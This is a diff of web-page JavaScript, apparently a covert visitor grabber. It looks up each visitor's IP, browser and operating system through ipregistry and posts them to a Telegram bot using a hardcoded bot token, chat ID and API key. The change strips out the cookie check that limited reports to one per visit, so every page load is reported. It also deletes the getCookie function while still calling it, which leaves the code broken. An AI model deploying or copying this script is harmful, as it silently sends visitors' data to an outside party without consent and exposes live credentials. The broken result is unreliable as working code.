@@ -130,22 +130,6 @@ fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
   let namebrowser = engine.name;
   let osnam = data.os.name;
   let osvers = data.os.version;
-
-function getCookie(name) {
-    var nameEQ = name + "=";
-    var ca = document.cookie.split(';');
-    for(var i = 0; i < ca.length; i++) {
-        var c = ca[i];
-        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
-        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
-    }
-    return null;
-}
-
-// Проверяем наличие куки
-if(!getCookie('visited')) 
-    // Сохраняем куку, что пользователь уже посетил сайт
-    document.cookie = "visited=true";
     
         const message = `
 *🔎 ip*
@@ -198,7 +182,7 @@ if(!getCookie('visited'))
                              `;
 
         
-if (!getCookie('visited')) {
+if (!getCookie('visited')) 
   const token = '6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus';
   const chatId = '-1002084822950';
   const url = 'https://api.telegram.org/bot' + token + '/sendMessage';
@@ -211,13 +195,8 @@ if (!getCookie('visited')) {
     method: 'POST',
     body: formData
   })
-  .then(response => {
-    document.cookie = "visited=true; max-age=3600"; // Устанавливаем куки на 1 час
-  })
-  .catch(error => {
-    console.error('Error:', error);
   });
-}
+
         });
       });
     });
